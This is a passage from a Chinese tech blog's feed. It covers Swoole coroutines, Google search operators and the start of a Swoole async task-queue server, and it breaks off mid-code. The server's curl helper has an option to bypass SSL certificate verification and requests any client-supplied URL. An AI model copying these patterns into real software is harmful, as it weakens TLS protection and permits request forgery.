class="line"></span><br><span class="line">echo &quot;开始煮饭...&quot; . PHP_EOL;</span><br><span class="line">sleep(8);</span><br><span class="line">echo &quot;饭熟了...&quot; . PHP_EOL;</span><br><span class="line"></span><br><span class="line">echo &quot;放油...&quot; . PHP_EOL;</span><br><span class="line">sleep(1);</span><br><span class="line">echo &quot;煎鱼...&quot; . PHP_EOL;</span><br><span class="line">sleep(3);</span><br><span class="line">echo &quot;放盐...&quot; . PHP_EOL;</span><br><span class="line">sleep(1);</span><br><span class="line">echo &quot;出锅...&quot; . PHP_EOL;</span><br><span class="line"></span><br><span class="line">var_dump(&#39;总耗时：&#39; . (time() - $startTime) . &#39; 分钟&#39;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">cook();</span><br></pre></td></tr></table></figure><p>协程实现逻辑：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">use Swoole\Coroutine;</span><br><span class="line">use Swoole\Coroutine\WaitGroup;</span><br><span class="line">use Swoole;</span><br><span class="line"></span><br><span class="line">class Cook</span><br><span class="line">&#123;</span><br><span class="line">public function cookByCo()</span><br><span class="line">&#123;</span><br><span class="line">$startTime &#x3D; time();</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; 开启一键协程化: https:&#x2F;&#x2F;wiki.swoole.com&#x2F;#&#x2F;runtime?id&#x3D;swoole_hook_all</span><br><span class="line">Swoole\Runtime::enableCoroutine($flags &#x3D; SWOOLE_HOOK_ALL);</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; 创建一个协程容器: https:&#x2F;&#x2F;wiki.swoole.com&#x2F;#&#x2F;coroutine&#x2F;scheduler</span><br><span class="line">&#x2F;&#x2F; 相当于进入厨房</span><br><span class="line">\Co\run(function () &#123;</span><br><span class="line">&#x2F;&#x2F; 等待结果: https:&#x2F;&#x2F;wiki.swoole.com&#x2F;#&#x2F;coroutine&#x2F;wait_group?id&#x3D;waitgroup</span><br><span class="line">&#x2F;&#x2F; 记录哪道菜做好了，哪道菜还需要多长时间</span><br><span class="line">$wg &#x3D; new WaitGroup();</span><br><span class="line">&#x2F;&#x2F; 保存数据的结果</span><br><span class="line">&#x2F;&#x2F; 装好的菜</span><br><span class="line">$result &#x3D; [];</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; 记录一下煲汤(记录一个任务)</span><br><span class="line">$wg-&gt;add();</span><br><span class="line">&#x2F;&#x2F; 创建一个煲汤任务(开启一个新的协程)</span><br><span class="line">Coroutine::create(function () use ($wg, &amp;$result) &#123;</span><br><span class="line">echo &quot;开始煲汤...&quot; . PHP_EOL;</span><br><span class="line">&#x2F;&#x2F; 煲汤需要6分钟，所以我们也不用在这里等汤煮好，</span><br><span class="line">&#x2F;&#x2F; 直接去做下一个任务：炒菜(协程切换)</span><br><span class="line">sleep(8);</span><br><span class="line">echo &quot;汤好了...&quot; . PHP_EOL;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; 装盘</span><br><span class="line">$result[&#39;soup&#39;] &#x3D; &#39;一锅汤&#39;;</span><br><span class="line">$wg-&gt;done(); &#x2F;&#x2F; 标记任务完成</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; 记录一下煮饭(记录一个任务)</span><br><span class="line">$wg-&gt;add();</span><br><span class="line">&#x2F;&#x2F; 创建一个煮饭任务(开启一个新的协程)</span><br><span class="line">Coroutine::create(function () use ($wg, &amp;$result) &#123;</span><br><span class="line">echo &quot;开始煮饭...&quot; . PHP_EOL;</span><br><span class="line">&#x2F;&#x2F; 煮饭需要5分钟，所以我们不用在这里等饭煮熟，放在这里一会再来看看好了没有</span><br><span class="line">&#x2F;&#x2F; 我们先去煲汤(协程切换)</span><br><span class="line">sleep(10);</span><br><span class="line">echo &quot;饭熟了...&quot; . PHP_EOL;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; 装盘</span><br><span class="line">$result[&#39;rice&#39;] &#x3D; &#39;一锅米饭&#39;;</span><br><span class="line">$wg-&gt;done(); &#x2F;&#x2F; 标记任务完成</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; 记录一下炒菜</span><br><span class="line">$wg-&gt;add();</span><br><span class="line">&#x2F;&#x2F; 创建一个炒菜任务(再开启一个新的协程)</span><br><span class="line">Coroutine::create(function () use ($wg, &amp;$result) &#123;</span><br><span class="line">&#x2F;&#x2F; 煎鱼的过程必须放在一个协程里面执行，如果不是的话可能鱼还没煎好就出锅了</span><br><span class="line">&#x2F;&#x2F; 因为开启协程后，IO全是异步了，在此demo中每次遇到sleep都会挂起当前协程</span><br><span class="line">&#x2F;&#x2F; 切换到下一个协程执行。</span><br><span class="line">&#x2F;&#x2F; 例如把出锅这一步开启一个新协程执行，则在煎鱼的时候鱼，鱼就出锅了。</span><br><span class="line">echo &quot;放油...&quot; . PHP_EOL;</span><br><span class="line">sleep(1);</span><br><span class="line">echo &quot;煎鱼...&quot; . PHP_EOL;</span><br><span class="line">sleep(3);</span><br><span class="line">echo &quot;放盐...&quot; . PHP_EOL;</span><br><span class="line">sleep(1);</span><br><span class="line">echo &quot;出锅...&quot; . PHP_EOL;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; 装盘</span><br><span class="line">$result[&#39;food&#39;] &#x3D; &#39;鱼香肉丝&#39;;</span><br><span class="line">$wg-&gt;done();</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; 等待全部任务完成</span><br><span class="line">$wg-&gt;wait();</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; 返回数据(上菜！)</span><br><span class="line">var_dump($result);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">var_dump(&#39;总耗时：&#39; . (time() - $startTime) . &#39; 分钟&#39;);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">$cooker &#x3D; new Cook();</span><br><span class="line">$cooker-&gt;cookByCo();</span><br></pre></td></tr></table></figure><p>通过执行代码可以看到协程方式比传统阻塞方式足足快了十三分钟。从协程方式实现的逻辑中可以看到，通过无感知编写”同步代码“，却实现了异步 I/O 的效果和性能。避免了传统异步回调所带来的离散的代码逻辑和陷入多层回调中导致代码无法维护。</p><p>不过需要注意的是传统回调的触发条件是<strong>回调函数</strong>，而协程切换的条件是<strong>遇到 I/O</strong>。</p><h3 id="协程误区"><a href="#协程误区" class="headerlink" title="协程误区"></a>协程误区</h3><p>实际使用协程时，需要注意以下几个误区，否则效果可能会事倍功半。</p><p>理论上来讲，协程解决的是 I/O 复用的问题，对于计算密集的问题无效。</p><ul><li>如果cpu很闲(大部分时间都消耗在网络磁盘上了)，协程就可以提高cpu的利用率</li><li>如果cpu本身就很饱和了 用协程反而会降低cpu利用率（需要花时间来做协程调度）。</li><li>swoole 是单线程</li></ul><h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><ul><li><a href="https://learnku.com/articles/44836" target="_blank" rel="noopener">swoole 学习笔记-做一顿饭来理解协程</a></li><li><a href="https://www.easyswoole.com/Cn/NoobCourse/coroutine.html" target="_blank" rel="noopener">协程-EasySwoole</a></li><li><a href="https://xiaoxiami.gitbook.io/swoole/swoole-ji-chu/jin-cheng-nei-cun-xie-cheng/swoole-xie-cheng" target="_blank" rel="noopener">swoole 协程-swoole 高手之路</a></li><li><a href="https://segmentfault.com/q/1010000021755294" target="_blank" rel="noopener">swoole一个协程问题？为什么效率变慢了</a></li></ul>]]></content>
    
    
    <summary type="html">&lt;p&gt;第一次接触协程这个概念，是在学习Swoole时，那时看官方文档并不能完全理解协程到底是个什么东西以及该如何正确的使用它。&lt;/p&gt;</summary>
    
    
    
    <category term="PHP" scheme="https://www.0x2beace.com/categories/PHP/"/>
    
    
    <category term="PHP" scheme="https://www.0x2beace.com/tags/PHP/"/>
    
    <category term="Swoole" scheme="https://www.0x2beace.com/tags/Swoole/"/>
    
  </entry>
  
  <entry>
    <title>如何高效的利用谷歌搜索引擎</title>
    <link href="https://www.0x2beace.com/how-to-use-google-search-engine-efficiently/"/>
    <id>https://www.0x2beace.com/how-to-use-google-search-engine-efficiently/</id>
    <published>2020-11-28T09:03:14.000Z</published>
    <updated>2020-11-28T09:04:27.083Z</updated>
    
    <content type="html"><![CDATA[<p>整理这篇笔记的目的是整理那些不太常用但又十分有用的Google 搜索引擎搜索技巧。</p><a id="more"></a><h3 id="搜索完全匹配的搜索结果"><a href="#搜索完全匹配的搜索结果" class="headerlink" title="搜索完全匹配的搜索结果"></a>搜索完全匹配的搜索结果</h3><p>有时候我们会有这样一种需求：我需要查找某个关键字同时出现的内容，该怎么做呢？<br>这个时候就需要用到完全匹配这招了。</p><p>在关键字的左右两边分别加上<code>&quot;</code>英文状态的双引号，如：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;HHKB 是什么&quot;</span><br></pre></td></tr></table></figure><h3 id="从搜索结果中排除特定词"><a href="#从搜索结果中排除特定词" class="headerlink" title="从搜索结果中排除特定词"></a>从搜索结果中排除特定词</h3><p>为了进一步筛选搜索结果，还需要学会另一招，利用<code>-</code>减号排除特定关键字：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;the most important benefit of education&quot;-&quot;unitedstates&quot;</span><br></pre></td></tr></table></figure><p>上面这段表示的意思是：要求Google 返回含有”the most important benefit of education” 但不存在”unitedstates”的内容。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">daddy -film</span><br></pre></td></tr></table></figure><p>daddy 的意思是父亲，同时也是一部电影，当你搜索”daddy” 时，谷歌只返回有关电影的内容。如果你只想搜索时关于父亲，要排除电影，在需要排除的前面加上<code>-</code>，例如上面所示。你会发现结果中没有与电影有关的内容。</p><h3 id="搜索通配符或未知字词"><a href="#搜索通配符或未知字词" class="headerlink" title="搜索通配符或未知字词"></a>搜索通配符或未知字词</h3><p>怎样用？</p><p>即搜索字符串中可以包含星号<code>*</code>，用星号来替代任意字符串。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powerful*life</span><br></pre></td></tr></table></figure><h3 id="搜索社交媒体"><a href="#搜索社交媒体" class="headerlink" title="搜索社交媒体"></a>搜索社交媒体</h3><p>当你只想在某个社交媒体里找到相关字词时，在用于搜索社交媒体的字词前加上<code>@</code>，例如：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">@twice</span><br></pre></td></tr></table></figure><h3 id="组合搜索"><a href="#组合搜索" class="headerlink" title="组合搜索"></a>组合搜索</h3><p>在各个搜索查询字间加上“OR”关键字，例如：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">race OR marathon</span><br></pre></td></tr></table></figure><p>搜索到的结果会返回关于 race 或者 marathon，或两者均有的相关内容。</p><h3 id="搜索特定价格"><a href="#搜索特定价格" class="headerlink" title="搜索特定价格"></a>搜索特定价格</h3><p>用这个方法来搜索特定价格的商品，例如想要搜索价格为<code>$200</code>的书包，可以这样搜索：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$200 bag</span><br></pre></td></tr></table></figure><h3 id="在某个数字范围内执行搜索"><a href="#在某个数字范围内执行搜索" class="headerlink" title="在某个数字范围内执行搜索"></a>在某个数字范围内执行搜索</h3><p>比如想要搜索介于 $100 - $200 之间的商品，或者是 10kg - 20kg 的某种东西，亦或者是 1900 - 1945 年发生的事情，等等。</p><p>在两个数字之间加上<code>..</code>符号，例如搜索价格 $50 - $100 的桌子：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">amazon table $50..$100</span><br></pre></td></tr></table></figure><h3 id="搜索特定网站"><a href="#搜索特定网站" class="headerlink" title="搜索特定网站"></a>搜索特定网站</h3><p>只在特定的网站里搜索相关资料，在相应的域名前面加上<code>&quot;site:&quot;</code>，例如要在 youtube 里找关于猫的电影，可以这样搜索：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">site:youtube.com cat</span><br></pre></td></tr></table></figure><h3 id="搜索相关网站"><a href="#搜索相关网站" class="headerlink" title="搜索相关网站"></a>搜索相关网站</h3><p>想找和某个网站有关系或者相似特质的网站，在已知网址前面加上<code>related:</code>，例如：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">related:google.com</span><br></pre></td></tr></table></figure><p>google.com 是一个搜索网站，加上<code>related:</code>关键字之后，搜索的结果是其他搜索引擎，如 Yahoo、Bing 等</p><h3 id="寻找主题标记"><a href="#寻找主题标记" class="headerlink" title="寻找主题标记"></a>寻找主题标记</h3><p>在关键字前面加上<code>#</code>符号，</p><h3 id="获取网站的相关资料"><a href="#获取网站的相关资料" class="headerlink" title="获取网站的相关资料"></a>获取网站的相关资料</h3><p>如果你想知道某个网站是关于什么的，可以这样子搜索：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">info:baidu.com</span><br></pre></td></tr></table></figure><h3 id="多组合运用"><a href="#多组合运用" class="headerlink" title="多组合运用"></a>多组合运用</h3><ol><li>在 channelnewsasia.com 网站里搜索关于天灾的意外，除了地震，发生在2012年到2016年之间。</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">site:channelnewsasia.com ~accident &quot;natural disaster&quot; -earthquake 2012..2016</span><br></pre></td></tr></table></figure><p>其中波浪符号<code>~</code>表示也搜索和这个字有关联的内容，如 failure，crash、mishap 等</p><ol start="2"><li><p>从两个购物网站搜索手表，价格在 $100 到 $200 之间</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">site:shopee.com.my OR site:amazon.com watch $100..$200</span><br></pre></td></tr></table></figure></li><li><p>从ebay 与 amazon网站搜索苹果与微软的产品，排除平板电脑</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">site:ebay.com OR site:amazon.com apple OR microsoft -tablet</span><br></pre></td></tr></table></figure></li><li><p>在吉隆坡一带搜索低收费住宿，价格在$100 到 $200 之间，排除 airbnb，靠近轻快地铁</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">KL ~budget~accommodation $100..$200 -airbnb &quot;nearby LRT station&quot;</span><br></pre></td></tr></table></figure></li></ol>]]></content>
    
    
    <summary type="html">&lt;p&gt;整理这篇笔记的目的是整理那些不太常用但又十分有用的Google 搜索引擎搜索技巧。&lt;/p&gt;</summary>
    
    
    
    <category term="Skill" scheme="https://www.0x2beace.com/categories/Skill/"/>
    
    
    <category term="Skill" scheme="https://www.0x2beace.com/tags/Skill/"/>
    
    <category term="Google Search" scheme="https://www.0x2beace.com/tags/Google-Search/"/>
    
  </entry>
  
  <entry>
    <title>PHP + Swoole 实现异步任务队列</title>
    <link href="https://www.0x2beace.com/php-swoole-to-achieve-asynchronous-task-queue/"/>
    <id>https://www.0x2beace.com/php-swoole-to-achieve-asynchronous-task-queue/</id>
    <published>2020-11-26T12:33:48.000Z</published>
    <updated>2020-11-27T13:54:36.939Z</updated>
    
    <content type="html"><![CDATA[<p>最近接手一个对接短信的需求，这个需求本身并没有什么难度，直接按照服务商的要求请求具体的接口就好了。</p><a id="more"></a><p>最开始是使用传统的同步阻塞方式实现了一遍，用户体验并不好，发送短信需要等待，等待服务商的接口返回内容，才继续向下执行。</p><p>因为最近在学习<a href="https://swoole.com/" target="_blank" rel="noopener">Swoole</a>，Swoole 中有一个“<a href="https://wiki.swoole.com/#/start/start_task?id=%E6%89%A7%E8%A1%8C%E5%BC%82%E6%AD%A5%E4%BB%BB%E5%8A%A1task" target="_blank" rel="noopener">异步任务</a>”，就特别适合以下应用场景：</p><ol><li>需要执行耗时操作，会阻塞主进程</li><li>用户不需要等待返回结果</li></ol><p>结合官网手册和<a href="https://learnku.com/blog/pltrue" target="_blank" rel="noopener">Latent</a> 的<a href="https://learnku.com/articles/43752" target="_blank" rel="noopener">基于 swoole 下 异步消息队列 API</a>，最终简单封装了一个处理API 的类，实现如下：</p><h3 id="服务端"><a href="#服务端" class="headerlink" title="服务端"></a>服务端</h3><p>服务端是基于本地Tcp，监听<code>9501</code>端口。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class taskServer&#123;</span><br><span class="line">const HOST &#x3D; &quot;127.0.0.1&quot;;</span><br><span class="line">const PORT &#x3D; 9501;</span><br><span class="line">public $server &#x3D; null;</span><br><span class="line"></span><br><span class="line">public function __construct()</span><br><span class="line">&#123;</span><br><span class="line">$this-&gt;server &#x3D; new SWoole\Server(self::HOST, self::PORT);</span><br><span class="line">$this-&gt;server-&gt;set(array(</span><br><span class="line">&quot;enable_coroutine&quot; &#x3D;&gt; false,     &#x2F;&#x2F; 关闭协程</span><br><span class="line">&quot;worker_num&quot; &#x3D;&gt; 2,               &#x2F;&#x2F; 开启的进程数 一般为cup核数 1-4 倍</span><br><span class="line">&quot;task_worker_num&quot; &#x3D;&gt; 2,          &#x2F;&#x2F; task进程的数量</span><br><span class="line">&#39;daemonize&#39; &#x3D;&gt; true,             &#x2F;&#x2F; 以守护进程的方式启动</span><br><span class="line">));</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; 注册事件</span><br><span class="line">$this-&gt;server-&gt;on(&quot;connect&quot;, [$this, &quot;onConnect&quot;]);</span><br><span class="line">$this-&gt;server-&gt;on(&quot;receive&quot;, [$this, &quot;onReceive&quot;]);</span><br><span class="line">$this-&gt;server-&gt;on(&quot;close&quot;, [$this, &quot;onClose&quot;]);</span><br><span class="line">$this-&gt;server-&gt;on(&quot;task&quot;, [$this, &quot;onTask&quot;]);</span><br><span class="line">$this-&gt;server-&gt;on(&quot;finish&quot;, [$this, &quot;onFinish&quot;]);</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; 启用服务</span><br><span class="line">$this-&gt;server-&gt;start();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#x2F;**</span><br><span class="line"> * 监听连接事件</span><br><span class="line"> * @param $server</span><br><span class="line"> * @param $fd</span><br><span class="line"> *&#x2F;</span><br><span class="line">public function onConnect($server, $fd)&#123;</span><br><span class="line">echo &quot;连接成功&quot;.PHP_EOL;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#x2F;**</span><br><span class="line"> * 监听客户端发送的消息</span><br><span class="line"> * @param $server       &quot;Server 对象&quot;</span><br><span class="line"> * @param $fd           &quot;唯一标示&quot;</span><br><span class="line"> * @param $form_id</span><br><span class="line"> * @param $data         &quot;客户端发送的数据&quot;</span><br><span class="line"> *&#x2F;</span><br><span class="line">public function onReceive($server, $fd, $form_id, $data)&#123;</span><br><span class="line">&#x2F;&#x2F; 投递任务</span><br><span class="line">$server-&gt;task($data);</span><br><span class="line">$server-&gt;send($fd, &quot;这是客户端向服务端发送的信息：&#123;$data&#125;&quot;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#x2F;**</span><br><span class="line"> * 监听异步任务task事件</span><br><span class="line"> * @param $server</span><br><span class="line"> * @param $task_id</span><br><span class="line"> * @param $worker_id</span><br><span class="line"> * @param $data</span><br><span class="line"> * @return string</span><br><span class="line"> *&#x2F;</span><br><span class="line">public function onTask($server, $task_id, $worker_id, $data)&#123;</span><br><span class="line">$data &#x3D; json_decode($data, true);</span><br><span class="line">echo &quot;开始执行异步任务&quot;.PHP_EOL;</span><br><span class="line">try &#123;</span><br><span class="line">&#x2F;&#x2F; 开始执行任务</span><br><span class="line">$this-&gt;addLog(date(&#39;Y-m-d H:i:s&#39;).&quot;开始执行任务&quot;.PHP_EOL );</span><br><span class="line">&#x2F;&#x2F; 通知worker（必须 return，否则不会调用 onFinish）</span><br><span class="line">return $this-&gt;curl($data[&#39;url&#39;], $data[&#39;data&#39;], $data[&#39;type&#39;]);</span><br><span class="line">&#125; catch (Exception $exception) &#123;</span><br><span class="line">&#x2F;&#x2F; 执行任务失败</span><br><span class="line">$this-&gt;addLog(date(&#39;Y-m-d H:i:s&#39;).&quot;执行任务失败&quot;.PHP_EOL);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#x2F;**</span><br><span class="line"> * 监听finish 事件</span><br><span class="line"> * @param $server</span><br><span class="line"> * @param $task_id</span><br><span class="line"> * @param $data</span><br><span class="line"> *&#x2F;</span><br><span class="line">public function onFinish($server, $task_id, $data)&#123;</span><br><span class="line">$this-&gt;addLog(date(&quot;Y-m-d H:i:s&quot;).&quot;异步任务执行完成&quot;.PHP_EOL);</span><br><span class="line">print_r( &quot;来自服务端的消息：&#123;$data&#125;&quot;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#x2F;**</span><br><span class="line"> * 监听关闭连接事件</span><br><span class="line"> * @param $server</span><br><span class="line"> * @param $fd</span><br><span class="line"> *&#x2F;</span><br><span class="line">public function onClose($server, $fd)&#123;</span><br><span class="line">echo &quot;关闭TCP 连接&quot;.PHP_EOL;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#x2F;**</span><br><span class="line"> * 发起Get 或 Post 请求</span><br><span class="line"> * @param string $url           请求地址</span><br><span class="line"> * @param array $request_data   请求参数</span><br><span class="line"> * @param string $request_type  请求类型</span><br><span class="line"> * @param array $headers        头信息</span><br><span class="line"> * @param bool $is_ssl          是否是ssl</span><br><span class="line"> * @return bool|string</span><br><span class="line"> *&#x2F;</span><br><span class="line">public function curl($url &#x3D; &#39;&#39;, $request_data &#x3D; [], $request_type &#x3D; &#39;get&#39;, $headers &#x3D; [], $is_ssl &#x3D; false)</span><br><span class="line">&#123;</span><br><span class="line">$curl &#x3D; curl_init (); &#x2F;&#x2F; 初始化</span><br><span class="line">&#x2F;&#x2F; 设置 URL</span><br><span class="line">curl_setopt($curl, CURLOPT_URL, $url);</span><br><span class="line">&#x2F;&#x2F; 不返回 Response 头部信息</span><br><span class="line">curl_setopt ( $curl, CURLOPT_HEADER, 0 );</span><br><span class="line">&#x2F;&#x2F; 如果成功只将结果返回，不自动输出任何内容</span><br><span class="line">curl_setopt ( $curl, CURLOPT_RETURNTRANSFER, 1 );</span><br><span class="line">&#x2F;&#x2F; 设置请求参数</span><br><span class="line">curl_setopt ( $curl, CURLOPT_POSTFIELDS, http_build_query($request_data));</span><br><span class="line">&#x2F;&#x2F; TRUE 时追踪句柄的请求字符串</span><br><span class="line">curl_setopt($curl, CURLINFO_HEADER_OUT, true);</span><br><span class="line">&#x2F;&#x2F; Post 类型增加以下处理</span><br><span class="line">if( $request_type &#x3D;&#x3D; &#39;post&#39;) &#123;</span><br><span class="line">&#x2F;&#x2F; 设置为POST方式</span><br><span class="line">curl_setopt ( $curl, CURLOPT_POST, 1 );</span><br><span class="line">&#x2F;&#x2F; 设置头信息</span><br><span class="line">curl_setopt($curl, CURLOPT_HTTPHEADER, array(&#39;Content-Type: application&#x2F;json&#39;, &#39;Content-Length:&#39; . strlen(json_encode($request_data))));</span><br><span class="line">&#x2F;&#x2F; 设置请求参数</span><br><span class="line">curl_setopt ( $curl, CURLOPT_POSTFIELDS, json_encode($request_data));</span><br><span class="line">&#x2F;&#x2F; 当POST 数据大于1024 时强制执行</span><br><span class="line">curl_setopt ( $curl, CURLOPT_HTTPHEADER, array(&quot;Expect:&quot;));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; 判断是否绕过证书</span><br><span class="line">if( $is_ssl ) &#123;</span><br><span class="line">&#x2F;&#x2F;绕过ssl验证</span><br><span class="line">curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, 